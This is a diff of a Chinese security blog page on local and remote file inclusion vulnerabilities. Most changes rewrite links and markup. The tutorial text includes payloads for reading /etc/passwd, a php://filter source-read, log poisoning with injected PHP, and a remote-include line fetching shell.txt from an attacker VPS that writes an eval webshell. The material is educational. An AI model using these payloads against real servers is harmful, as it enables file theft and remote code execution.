@@ -9,7 +9,7 @@
     <meta name="description" content="简介任意文件读取漏洞是通过一些手段可以读取服务器上开发者不允许读到的文件。主要包括的文件类型有：  服务器的各种配置文件 以文件形式存储的密钥 服务器信息 正在执行的进程信息 ……   历史命令 网络信息 应用源码及二进制程序 ……  以上文件内容通过任意文件读取漏洞可以作为信息收集的强有力的补充。 任意文件读取漏洞的成因：  开发人员对于意外情况考虑不足所致，从本质上来看文件读取漏洞的存在与不是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="任意文件包含漏洞">
-<meta property="og:url" content="https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:url" content="http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="PuTa0T&#39; Blog">
 <meta property="og:description" content="简介任意文件读取漏洞是通过一些手段可以读取服务器上开发者不允许读到的文件。主要包括的文件类型有：  服务器的各种配置文件 以文件形式存储的密钥 服务器信息 正在执行的进程信息 ……   历史命令 网络信息 应用源码及二进制程序 ……  以上文件内容通过任意文件读取漏洞可以作为信息收集的强有力的补充。 任意文件读取漏洞的成因：  开发人员对于意外情况考虑不足所致，从本质上来看文件读取漏洞的存在与不是">
 <meta property="og:locale" content="en_US">
@@ -22,17 +22,17 @@
     
       
         
-          <link rel="shortcut icon" href="/PuTa0T/puta0t.github.io/images/logo.png">
+          <link rel="shortcut icon" href="/images/logo.png">
         
       
       
         
-          <link rel="icon" type="image/png" href="/PuTa0T/puta0t.github.io/images/logo.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/PuTa0T/puta0t.github.io/images/logo.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
         
       
     
@@ -40,14 +40,14 @@
     <title>任意文件包含漏洞</title>
     <!-- styles -->
     
-<link rel="stylesheet" href="/PuTa0T/puta0t.github.io/css/style.css">
+<link rel="stylesheet" href="/css/style.css">
 
     <!-- persian styles -->
     
     <!-- rss -->
     
     
-      <link rel="alternate" href="/PuTa0T/puta0t.github.io/true" title="PuTa0T&#39; Blog" type="application/atom+xml" />
+      <link rel="alternate" href="/true" title="PuTa0T&#39; Blog" type="application/atom+xml" />
     
 	<!-- mathjax -->
 	
@@ -63,19 +63,19 @@
     <span id="nav">
       <ul>
          
-          <li><a href="/PuTa0T/puta0t.github.io/">Home</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/about/">About</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/archives/">Writing</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/categories/">Categories</a></li>
+          <li><a href="/categories/">Categories</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/tags/">Tags</a></li>
+          <li><a href="/tags/">Tags</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/search/">Search</a></li>
+          <li><a href="/search/">Search</a></li>
          
-          <li><a href="https://github.com/PuTa0T">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/PuTa0T">Projects</a></li>
         
       </ul>
     </span>
@@ -83,10 +83,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post " href="/PuTa0T/puta0t.github.io/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post " href="/2021/08/17/Hexo%E6%93%8D%E4%BD%9C/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post " href="/PuTa0T/puta0t.github.io/2021/07/19/ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post " href="/2021/07/19/ARP%E6%AC%BA%E9%AA%97%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -99,17 +99,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&text=任意文件包含漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&is_video=false&description=任意文件包含漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=任意文件包含漏洞&body=Check out this article: https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&name=任意文件包含漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&t=任意文件包含漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&text=任意文件包含漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&is_video=false&description=任意文件包含漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=任意文件包含漏洞&body=Check out this article: http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&name=任意文件包含漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&t=任意文件包含漏洞"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -147,14 +147,14 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/PuTa0T/puta0t.github.io/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
     </div>
 
 
       
     <div class="article-tag">
         <i class="fas fa-tag"></i>
-        <a class="tag-link-link" href="/PuTa0T/puta0t.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">任意文件包含漏洞</a>
+        <a class="tag-link-link" href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">任意文件包含漏洞</a>
     </div>
 
 
@@ -301,19 +301,19 @@
 </ol>
 <h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol>
 <li><p>读取敏感文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">[url]?arg=/etc/passwd <br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=/etc/passwd </span><br></pre></td></tr></table></figure>
 <p>通过对敏感文件的读取，获得服务器信息，可作为信息收集的强有力补充。</p>
 </li>
 <li><p>利用封装协议读取源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">[url]?arg=php://filter/read=convert.base64-encode/resource=config.php	<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[url]?arg=php://filter/read=convert.base64-encode/resource=config.php	</span><br></pre></td></tr></table></figure>
 <p>通过对php伪协议中的filter机制的利用，绕过对php文件的解析，获得源码的base64编码，解码后可查看源码</p>
 </li>
 <li><p>包含图片GetShell<br>在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</p>
 </li>
 <li><p>截断包含<br>同前面介绍的情况类似</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 文件路径前面可控后面不可控<br><span class="hljs-bullet">-</span> 使用<span class="hljs-code">`%00`</span>截断，将不可控后部截掉。<br><span class="hljs-bullet">-</span> 若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。<br><span class="hljs-bullet">1.</span> 文件路径后面可控前面不可控<br><span class="hljs-bullet">-</span> 使用<span class="hljs-code">`../`</span>进行目录穿越，进而直接读取文件。<br><span class="hljs-bullet">-</span> 如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。<br><span class="hljs-bullet">1.</span> 文件路径中间可控<br><span class="hljs-bullet">-</span> 类似第一种，但是不能使用Wrapper进行文件包含。<br></code></pre></td></tr></table></figure></li>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 文件路径前面可控后面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`%00`</span>截断，将不可控后部截掉。</span><br><span class="line"><span class="bullet">-</span> 若存在文件上传功能可尝试使用zip或phar进行文件包含进而执行PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径后面可控前面不可控</span><br><span class="line"><span class="bullet">-</span> 使用<span class="code">`../`</span>进行目录穿越，进而直接读取文件。</span><br><span class="line"><span class="bullet">-</span> 如果服务端是利用include等文件包含类的函数，则无法读取PHP文件中的PHP代码。</span><br><span class="line"><span class="bullet">1.</span> 文件路径中间可控</span><br><span class="line"><span class="bullet">-</span> 类似第一种，但是不能使用Wrapper进行文件包含。</span><br></pre></td></tr></table></figure></li>
 <li><p>包含Apache日志Getshell</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">条件：知道日志文件access.log的存放位置 ，默认位置：/var/log/httpd/access.log<br></code></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件：知道日志文件access.log的存放位置 ，默认位置：/var/log/httpd/access.log</span><br></pre></td></tr></table></figure>
 <p><code>access.log</code>文件记录了客户端每次请求的相关信息； 当我们访问一个不存在的资源时<code>access.log</code>文件仍然会记录这条资源信息。</p>
 <p>如果目标网站存在文件包含漏洞，但是没有可以包含的文件时，我们就可以尝试访问<code>http://www.vuln.com/&lt;?php phpinfo(); ?&gt;</code></p>
 <p>Apache会将这条信息记录在<code>access.log</code>文件中，这时如果我们访问<code>access.log</code>文件，就会触发文件包含漏洞。理论上是这样的，但是实际上却是输入的代码被转义无法解析。</p>
@@ -324,12 +324,12 @@
 <h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>Remote File Include(远程文件包含漏洞 )</p>
 <h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
 <h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><ol>
-<li>远程包含WebShell<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">?arg=http://攻击者的VPS/shell.txt<br><span class="hljs-comment">#会在网站目录生成名为 shell.php 的一句话木马</span><br></code></pre></td></tr></table></figure>
-shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    fputs(fopen(<span class="hljs-string">&#x27;./shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
+<li>远程包含WebShell<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>
+shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;./shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 <li>……</li>
 </ol>
 <p>在PHP中，文件包含用到的函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()		<span class="hljs-comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span><br>inclue_once()	<span class="hljs-comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><br><span class="hljs-keyword">require</span>()		<span class="hljs-comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span><br><span class="hljs-keyword">require_once</span>()	<span class="hljs-comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()		<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">inclue_once()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()		<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 <h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ol>
@@ -367,19 +367,19 @@ shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><p
     <div id="nav-footer" style="display: none">
       <ul>
          
-          <li><a href="/PuTa0T/puta0t.github.io/">Home</a></li>
+          <li><a href="/">Home</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/about/">About</a></li>
+          <li><a href="/about/">About</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/archives/">Writing</a></li>
+          <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/categories/">Categories</a></li>
+          <li><a href="/categories/">Categories</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/tags/">Tags</a></li>
+          <li><a href="/tags/">Tags</a></li>
          
-          <li><a href="/PuTa0T/puta0t.github.io/search/">Search</a></li>
+          <li><a href="/search/">Search</a></li>
          
-          <li><a href="https://github.com/PuTa0T">Projects</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/PuTa0T">Projects</a></li>
         
       </ul>
     </div>
@@ -390,17 +390,17 @@ shell.txt内容为<figure class="highlight php"><table><tr><td class="gutter"><p
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&text=任意文件包含漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&is_video=false&description=任意文件包含漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=任意文件包含漏洞&body=Check out this article: https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&name=任意文件包含漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://github.com/PuTa0T/puta0t.github.io/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&t=任意文件包含漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&text=任意文件包含漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&is_video=false&description=任意文件包含漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=任意文件包含漏洞&body=Check out this article: http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/04/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/&title=任意文件包含漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
